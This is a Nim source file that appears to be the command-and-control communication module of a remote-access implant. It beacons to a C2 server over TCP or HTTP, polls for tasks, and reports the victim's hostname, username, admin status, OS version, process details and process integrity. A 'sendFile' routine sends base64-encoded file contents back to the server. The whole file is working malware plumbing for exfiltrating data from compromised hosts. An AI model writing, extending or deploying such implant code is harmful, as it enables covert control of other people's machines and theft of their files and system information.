import std/[base64, json, os]

when defined(tcp):
  import std/net
elif defined(http):
  import std/httpclient

import types

proc connectToC2*(app: App) =
  let j = %*{
    "task": "connect",
    "taskId": -1,
    "error": "",
    "data": {}
  }

  when defined(http):
    try:
      let token = app.httpClient.getContent(app.httpRoot & "/r")
      app.token = token
      app.sendData($j)
    except OSError: discard
  elif defined(tcp):
    try:
      app.socket = newSocket()
      app.socket.connect(app.ip, Port(app.port))
      app.socket.send(encode($j) & "\r\n")
    except OSError:
      sleep(app.autoConnectTime)

proc sendData(app: App, data: string) =
  when defined(tcp):
    try: app.socket.send(encode(data) & "\r\n")
    except: app.connectToC2()
  elif defined(http):
    try:
      discard app.httpClient.postContent(app.httpRoot & "/t?id=" & app.token, body=encode(data))
      when defined(debug):
        echo "sending " & data
    except OSError:
      return

type DataType* = enum
  File, Text, Code, Image, Object

type 
  TaskOutput* = ref object
    task*: string
    taskId*: int
    error*: string
    data*: JsonNode

proc addData*(output: TaskOutput, dataType: DataType, name: string, contents: string) =
  let enContents = newJString(encode(contents))
  if output.data.isNil():
    output.data = %*{}
  case dataType:
  of File:
    output.data[name & "::file"] = enContents
  of Text:
    output.data[name & "::text"] = enContents
  of Code:
    output.data[name & "::code"] = enContents
  of Image:
    output.data[name & "::image"] = enContents
  of Object:
    output.data[name & "::object"] = enContents


proc sendOutput*(app: App, taskOutput: TaskOutput) =
  let j = %*
    {
      "task": taskOutput.task,
      "taskId": taskOutput.taskId,
      "error": taskOutput.error,
      "data": taskOutput.data
    }
  app.sendData($j)

proc identify*(app: App, taskId: int, hostname: string, isAdmin: bool, username: string, osType: string,
              windowsVersionInfo: tuple[majorVersion: int, minorVersion: int, buildNumber: int],
              linuxVersionInfo: tuple[kernelVersion: string], ownIntegrity: string, pid: int, pname: string) =
  let j = %*
    {
      "task": "identify",
      "taskId": taskId,
      "error": "",
      "data": {
        "hostname": hostname,
        "isAdmin": isAdmin,
        "username": username,
        "osType": osType,
        "ownIntegrity": ownIntegrity,
        "pid": pid,
        "pname": $pname,
        "windowsOsVersionInfo": {
          "majorVersion": windowsVersionInfo.majorVersion,
          "minorVersion": windowsVersionInfo.minorVersion,
          "buildNumber": windowsVersionInfo.buildNumber,
        },
        "linuxOsVersionInfo": {
          "kernelVersion": linuxVersionInfo.kernelVersion
        }
      }
    }
  app.sendData($j)

proc unknownTask*(app: App, taskId: int, taskName: string) =
  let j = %*
    {
      "task": taskName,
      "taskId": taskId,
      "error": "unknown task",
      "data": {}
    }
  app.sendData($j)

proc sendFile*(app: App, taskId: int, path: string, b64c: string, error: string = "") =
  let j = %*
    {
      "task": "file",
      "taskId": taskId,
      "error": error,
      "data": {
        "path": path,
        "contents": b64c
      }
    }
  app.sendData($j)

proc newTaskOutput*(taskId: int): TaskOutput =
  TaskOutput(
    task: "output",
    taskId: taskId,
    error: "",
    data: %*{}
  )

proc fetchTasks*(app: App): JsonNode =
  when defined(tcp):
    try: app.socket.send("tasksplz\r\n")
    except: 
      app.connectToC2()
      return %*[]
    let line = app.socket.recvLine()
    if line.len == 0:
      app.socket.close()
    let decoded = decode(line)
    result = parseJson(decoded)
  elif defined(http):
    var httpResponse: string
    var fail = false
    try:
      httpResponse = app.httpClient.getContent(app.httpRoot & "/t?id=" & app.token)
    except OSError:
      when defined(debug):
        echo getCurrentExceptionMsg()
      app.httpClient = newHttpClient()
      fail = true
    except HttpRequestError:
      app.connectToC2()
      fail = true
    if fail: return %*[]
    result = parseJson(decode(httpResponse))
